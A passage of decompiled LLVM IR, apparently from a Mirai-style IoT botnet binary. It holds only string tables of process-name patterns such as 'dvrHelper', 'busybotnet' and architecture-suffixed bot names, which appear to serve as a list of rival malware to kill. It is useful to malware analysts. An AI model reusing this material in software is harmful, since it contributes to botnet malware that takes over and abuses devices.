@global_var_805b55f.468 to i8*), i8* bitcast (i32* @global_var_805b561.469 to i8*), i8* bitcast (i32* @global_var_805b563.470 to i8*), i8* bitcast (i32* @global_var_805b565.471 to i8*), i8* bitcast (i32* @global_var_805b567.472 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b569.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b56c.474, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b56f.475, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b572.476, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b575.477, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b578.478, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b57b.479, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b57e.480, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b581.481, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b584.482, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b587.483, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b58a.484, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b58d.485, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b598.486, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b59d.487, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b5a3.488, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5a8.489, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5ab.490, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5ae.491, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5b1.492, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5b4.493, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5b7.494, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5ba.495, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5bd.496, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b5c0.497, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5c3.498, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5c7.499, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5cb.500, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5cf.501, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5d3.502, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5d7.503, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5db.504, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5df.505, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5e3.506, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b5e7.507, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b5eb.508, i32 0, i32 0)]
@global_var_805a318.510 = constant [8 x i8] c"jackmy*\00"
@global_var_805a320.511 = constant [9 x i8] c"busybox*\00"
@global_var_805a329.512 = constant [5 x i8] c"bin*\00"
@global_var_805a339.513 = constant [5 x i8] c"arm*\00"
@global_var_805a33e.514 = constant [8 x i8] c"mipsel*\00"
@global_var_805a34c.515 = constant [8 x i8] c"mips64*\00"
@global_var_805a354.516 = constant [6 x i8] c"i686*\00"
@global_var_805a35a.517 = constant [7 x i8] c"sparc*\00"
@global_var_805a37d.518 = constant [6 x i8] c"bruv*\00"
@global_var_805a383.519 = constant [7 x i8] c"sh2eb*\00"
@global_var_805a38a.520 = constant [8 x i8] c"sh2elf*\00"
@global_var_805a392.521 = constant [5 x i8] c"x86*\00"
@global_var_805a397.522 = constant [7 x i8] c"armv5*\00"
@global_var_805a39e.523 = constant [9 x i8] c"armv4tl*\00"
@global_var_805a3a7.524 = constant [7 x i8] c"armv4*\00"
@global_var_805a3ae.525 = constant [7 x i8] c"armv6*\00"
@global_var_805a3b5.526 = constant [9 x i8] c"powerpc*\00"
@global_var_805a3be.527 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_805a3cc.528 = constant [6 x i8] c"i586*\00"
@global_var_805a3d2.529 = constant [6 x i8] c"m68k*\00"
@global_var_805a3d8.530 = constant [8 x i8] c"x86_64*\00"
@global_var_805a3e0.531 = constant [12 x i8] c"jackmymips*\00"
@global_var_805a3ec.532 = constant [14 x i8] c"jackmymips64*\00"
@global_var_805a3fa.533 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_805a408.534 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_805a415.535 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_805a423.536 = constant [11 x i8] c"jackmysh4*\00"
@global_var_805a42e.537 = constant [11 x i8] c"jackmyx86*\00"
@global_var_805a439.538 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_805a446.539 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_805a455.540 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_805a462.541 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_805a46f.542 = constant [12 x i8] c"jackmyi686*\00"
@global_var_805a47b.543 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_805a48a.544 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_805a49e.545 = constant [12 x i8] c"jackmyi586*\00"
@global_var_805a4aa.546 = constant [12 x i8] c"jackmym68k*\00"
@global_var_805a4b6.547 = constant [13 x i8] c"jackmysparc*\00"
@global_var_805a4c3.548 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_805a4d1.549 = constant [12 x i8] c"hackmymips*\00"
@global_var_805a4dd.550 = constant [14 x i8] c"hackmymips64*\00"
@global_var_805a4eb.551 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_805a4f9.552 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_805a506.553 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_805a514.554 = constant [11 x i8] c"hackmysh4*\00"
@global_var_805a51f.555 = constant [11 x i8] c"hackmyx86*\00"
@global_var_805a52a.556 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_805a537.557 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_805a546.558 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_805a553.559 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_805a560.560 = constant [12 x i8] c"hackmyi686*\00"
@global_var_805a56c.561 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_805a57b.562 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_805a58f.563 = constant [12 x i8] c"hackmyi586*\00"
@global_var_805a59b.564 = constant [12 x i8] c"hackmym68k*\00"
@global_var_805a5a7.565 = constant [13 x i8] c"hackmysparc*\00"
@global_var_805a5b4.566 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_805a5c2.567 = constant [4 x i8] c"b1*\00"
@global_var_805a5c6.568 = constant [4 x i8] c"b2*\00"
@global_var_805a5ca.569 = constant [4 x i8] c"b3*\00"
@global_var_805a5ce.570 = constant [4 x i8] c"b4*\00"
@global_var_805a5d2.571 = constant [4 x i8] c"b5*\00"
@global_var_805a5d6.572 = constant [4 x i8] c"b6*\00"
@global_var_805a5da.573 = constant [4 x i8] c"b7*\00"
@global_var_805a5de.574 = constant [4 x i8] c"b8*\00"
@global_var_805a5e2.575 = constant [4 x i8] c"b9*\00"
@global_var_805a5e6.576 = constant [5 x i8] c"b10*\00"
@global_var_805a5eb.577 = constant [5 x i8] c"b11*\00"
@global_var_805a5f0.578 = constant [5 x i8] c"b12*\00"
@global_var_805a5f5.579 = constant [5 x i8] c"b13*\00"
@global_var_805a5fa.580 = constant [5 x i8] c"b14*\00"
@global_var_805a5ff.581 = constant [5 x i8] c"b15*\00"
@global_var_805a604.582 = constant [5 x i8] c"b16*\00"
@global_var_805a609.583 = constant [5 x i8] c"b17*\00"
@global_var_805a60e.584 = constant [5 x i8] c"b18*\00"
@global_var_805a613.585 = constant [5 x i8] c"b19*\00"
@global_var_805a618.586 = constant [5 x i8] c"b20*\00"
@global_var_805a61d.587 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_805a62f.588 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_805a639.589 = constant [11 x i8] c"dvrHelper*\00"
@global_var_805a644.590 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_805a64d.591 = constant [6 x i8] c"FEUB*\00"
@global_var_805a653.592 = constant [10 x i8] c"FTUdftui*\00"
@global_var_805a65d.593 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_805a667.594 = constant [7 x i8] c"jhUOH*\00"
@global_var_805a66e.595 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_805a678.596 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_805a683.597 = constant [9 x i8] c"kmymips*\00"
@global_var_805a68c.598 = constant [11 x i8] c"kmymips64*\00"
@global_var_805a697.599 = constant [11 x i8] c"kmymipsel*\00"
@global_var_805a6a2.600 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_805a6ac.601 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_805a6b7.602 = constant [8 x i8] c"kmysh4*\00"
@global_var_805a6bf.603 = constant [8 x i8] c"kmyx86*\00"
@global_var_805a6c7.604 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_805a6d1.605 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_805a6dd.606 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_805a6e7.607 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_805a6f1.608 = constant [9 x i8] c"kmyi686*\00"
@global_var_805a6fa.609 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_805a706.610 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_805a717.611 = constant [9 x i8] c"kmyi586*\00"
@global_var_805a720.612 = constant [9 x i8] c"kmym68k*\00"
@global_var_805a729.613 = constant [10 x i8] c"kmysparc*\00"
@global_var_805a733.614 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_805a73e.615 = constant [9 x i8] c"lolmips*\00"
@global_var_805a747.616 = constant [11 x i8] c"lolmips64*\00"
@global_var_805a752.617 = constant [11 x i8] c"lolmipsel*\00"
@global_var_805a75d.618 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_805a767.619 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_805a772.620 = constant [8 x i8] c"lolsh4*\00"
@global_var_805a77a.621 = constant [8 x i8] c"lolx86*\00"
@global_var_805a782.622 = constant [10 x i8] c"lolarmv5*\00"
@global_var_805a78c.623 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_805a798.624 = constant [10 x i8] c"lolarmv4*\00"
@global_var_805a7a2.625 = constant [10 x i8] c"lolarmv6*\00"
@global_var_805a7ac.626 = constant [9 x i8] c"loli686*\00"
@global_var_805a7b5.627 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_805a7c1.628 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_805a7d2.629 = constant [9 x i8] c"loli586*\00"
@global_var_805a7db.630 = constant [9 x i8] c"lolm68k*\00"
@global_var_805a7e4.631 = constant [10 x i8] c"lolsparc*\00"
@global_var_805a7ee.632 = constant [9 x i8] c"RYrydry*\00"
@global_var_805a7f7.633 = constant [9 x i8] c"telmips*\00"
@global_var_805a800.634 = constant [11 x i8] c"telmips64*\00"
@global_var_805a80b.635 = constant [11 x i8] c"telmipsel*\00"
@global_var_805a816.636 = constant [10 x i8] c"telsh2eb*\00"
@global_var_805a820.637 = constant [11 x i8] c"telsh2elf*\00"
@global_var_805a82b.638 = constant [8 x i8] c"telsh4*\00"
@global_var_805a833.639 = constant [8 x i8] c"telx86*\00"
@global_var_805a83b.640 = constant [10 x i8] c"telarmv5*\00"
@global_var_805a845.641 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_805a851.642 = constant [10 x i8] c"telarmv4*\00"
@global_var_805a85b.643 = constant [10 x i8] c"telarmv6*\00"
@global_var_805a865.644 = constant [9 x i8] c"teli686*\00"
@global_var_805a86e.645 = constant [12 x i8] c"telpowerpc*\00"
@global_var_805a87a.646 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_805a88b.647 = constant [9 x i8] c"teli586*\00"
@global_var_805a894.648 = constant [9 x i8] c"telm68k*\00"
@global_var_805a89d.649 = constant [10 x i8] c"telsparc*\00"
@global_var_805a8a7.650 = constant [11 x i8] c"telx86_64*\00"
@global_var_805a8b2.651 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_805a8bf.652 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_805a8ce.653 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_805a8dd.654 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_805a8eb.655 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_805a8fa.656 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_805a906.657 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_805a912.658 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_805a920.659 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_805a930.660 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_805a93e.661 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_805a94c.662 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_805a959.663 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_805a969.664 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_805a97e.665 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_805a98b.666 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_805a998.667 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_805a9a6.668 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_805a9b5.669 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_805a9bf.670 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_805a9c9.671 = constant [6 x i8] c"xxb1*\00"
@global_var_805a9cf.672 = constant [6 x i8] c"xxb2*\00"
@global_var_805a9d5.673 = constant [6 x i8] c"xxb3*\00"
@global_var_805a9db.674 = constant [6 x i8] c"xxb4*\00"
@global_var_805a9e1.675 = constant [6 x i8] c"xxb5*\00"
@global_var_805a9e7.676 = constant [6 x i8] c"xxb6*\00"
@global_var_805a9ed.677 = constant [6 x i8] c"xxb7*\00"
@global_var_805a9f3.678 = constant [6 x i8] c"xxb8*\00"
@global_var_805a9f9.679 = constant [6 x i8] c"xxb9*\00"
@global_var_805a9ff.680 = constant [7 x i8] c"xxb10*\00"
@global_var_805aa06.681 = constant [7 x i8] c"xxb11*\00"
@global_var_805aa0d.682 = constant [7 x i8] c"xxb12*\00"
@global_var_805aa14.683 = constant [7 x i8] c"xxb13*\00"
@global_var_805aa1b.684 = constant [7 x i8] c"xxb14*\00"
@global_var_805aa22.685 = constant [7 x i8] c"xxb15*\00"
@global_var_805aa29.686 = constant [7 x i8] c"xxb16*\00"
@global_var_805aa30.687 = constant [7 x i8] c"xxb17*\00"
@global_var_805aa37.688 = constant [7 x i8] c"xxb18*\00"
@global_var_805aa3e.689 = constant [7 x i8] c"xxb19*\00"
@global_var_805aa45.690 = constant [7 x i8] c"xxb20*\00"
@global_var_805aa4c.691 = constant [3 x i8] c"1*\00"
@global_var_805aa4f.692 = constant [3 x i8] c"2*\00"
@global_var_805aa52.693 = constant [3 x i8] c"3*\00"
@global_var_805aa55.694 = constant [3 x i8] c"4*\00"
@global_var_805aa58.695 = constant [3 x i8] c"5*\00"
@global_var_805aa5b.696 = constant [3 x i8] c"6*\00"
@global_var_805aa5e.697 = constant [3 x i8] c"7*\00"
@global_var_805aa61.698 = constant [3 x i8] c"8*\00"
@global_var_805aa64.699 = constant [3 x i8] c"9*\00"
@global_var_805aa67.700 = constant [4 x i8] c"10*\00"
@global_var_805aa6b.701 = constant [4 x i8] c"11*\00"
@global_var_805aa6f.702 = constant [4 x i8] c"12*\00"
@global_var_805aa73.703 = constant [4 x i8] c"13*\00"
@global_var_805aa77.704 = constant [4 x i8] c"14*\00"
@global_var_805aa7b.705 = constant [4 x i8] c"15*\00"
@global_var_805aa7f.706 = constant [4 x i8] c"16*\00"
@global_var_805aa83.707 = constant [4 x i8] c"17*\00"
@global_var_805aa87.708 = constant [4 x i8] c"18*\00"
@global_var_805aa8b.709 = constant [4 x i8] c"19*\00"
@global_var_805aa8f.710 = constant [4 x i8] c"20*\00"
@global_var_805aa93.711 = constant [4 x i8] c"bb*\00"
@global_var_805aa97.712 = constant [12 x i8] c"busybotnet*\00"
@global_var_805aaa3.713 = constant [6 x i8] c"pppd*\00"
@global_var_805aaa9.714 = constant [7 x i8] c"pppoe*\00"
@global_var_805aab0.715 = constant [6 x i8] c"wput*\00"
@global_var_805aab6.716 = constant [4 x i8] c"B1*\00"
@global_var_805aaba.717 = constant [4 x i8] c"B2*\00"
@global_var_805aabe.718 = constant [4 x i8] c"B3*\00"
@global_var_805aac2.719 = constant [4 x i8] c"B4*\00"
@global_var_805aac6.720 = constant [4 x i8] c"B5*\00"
@global_var_805aaca.721 = constant [4 x i8] c"B6*\00"
@global_var_805aace.722 = constant [4 x i8] c"B7*\00"
@global_var_805aad2.723 = constant [4 x i8] c"B8*\00"
@global_var_805aad6.724 = constant [4 x i8] c"B9*\00"
@global_var_805aada.725 = constant [5 x i8] c"B10*\00"
@global_var_805aadf.726 = constant [5 x i8] c"B11*\00"
@global_var_805aae4.727 = constant [5 x i8] c"B12*\00"
@global_var_805aae9.728 = constant [5 x i8] c"B13*\00"
@global_var_805aaee.729 = constant [5 x i8] c"B14*\00"
@global_var_805aaf3.730 = constant [5 x i8] c"B15*\00"
@global_var_805aaf8.731 = constant [5 x i8] c"B16*\00"
@global_var_805aafd.732 = constant [5 x i8] c"B17*\00"
@global_var_805ab02.733 = constant [5 x i8] c"B18*\00"
@global_var_805ab07.734 = constant [5 x i8] c"B20*\00"
@global_var_805ab0c.735 = constant [11 x i8] c"dvrhelper*\00"
@global_var_805ab20.736 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a318.510, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a320.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a329.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a32e.277, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a333.282, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a339.513, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a33e.514, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a346.276, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a34c.515, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a354.516, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a35a.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a361.280, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a366.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a36b.281, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a376.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a37d.518, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a346.276, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a34c.515, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a33e.514, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a383.519, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a38a.520, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a361.280, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a392.521, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a339.513, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a397.522, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a39e.523, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a3a7.524, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a3ae.525, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a354.516, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a3b5.526, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a3be.527, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a3cc.528, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a3d2.529, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a35a.517, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a3d8.530, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a3e0.531, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a3ec.532, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a3fa.533, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a408.534, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a415.535, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a423.536, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a42e.537, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a439.538, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a446.539, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a455.540, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a462.541, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a46f.542, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a47b.543, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805a48a.544, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a49e.545, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a4aa.546, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a4b6.547, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a4c3.548, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a4d1.549, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a4dd.550, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a4eb.551, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a4f9.552, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a506.553, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a514.554, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a51f.555, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a52a.556, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a537.557, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a546.558, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a553.559, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a560.560, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a56c.561, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805a57b.562, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a58f.563, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a59b.564, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a5a7.565, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a5b4.566, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5c2.567, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5c6.568, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5ca.569, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5ce.570, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5d2.571, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5d6.572, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5da.573, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5de.574, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a5e2.575, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5e6.576, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5eb.577, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5f0.578, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5f5.579, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5fa.580, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a5ff.581, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a604.582, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a609.583, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a60e.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a613.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a618.586, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_805a61d.587, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a62f.588, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a639.589, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a644.590, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a64d.591, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a653.592, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a65d.593, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a667.594, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a66e.595, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a678.596, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a683.597, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a68c.598, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a697.599, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6a2.600, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a6ac.601, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a6b7.602, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* 